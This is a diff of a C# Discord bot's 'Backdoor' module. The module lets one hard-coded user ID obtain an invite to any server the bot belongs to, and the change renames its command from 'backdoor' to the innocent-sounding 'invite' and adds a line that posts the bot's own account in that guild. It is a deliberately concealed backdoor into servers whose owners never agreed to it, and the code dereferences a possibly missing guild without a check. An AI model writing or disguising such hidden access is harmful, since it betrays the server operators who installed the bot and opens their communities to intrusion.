@@ -12,7 +12,7 @@ namespace rockpaperscissors.Core.Moderation
 {
     public class Backdoor : ModuleBase<SocketCommandContext>
     {
-        [Command("backdoor"), Summary("Get the invite of a server")]
+        [Command("invite"), Summary("Get the invite of a server")]
         public async Task BackdoorModule(ulong GuildId)
         {
             if (!(Context.User.Id == 129804455964049408))
@@ -25,6 +25,7 @@ namespace rockpaperscissors.Core.Moderation
                 await Context.Channel.SendMessageAsync(":x I am not in a guild with id=" + GuildId);
             }
             SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
+            await Context.Channel.SendMessageAsync($"{Guild.CurrentUser}");
 
 
             try
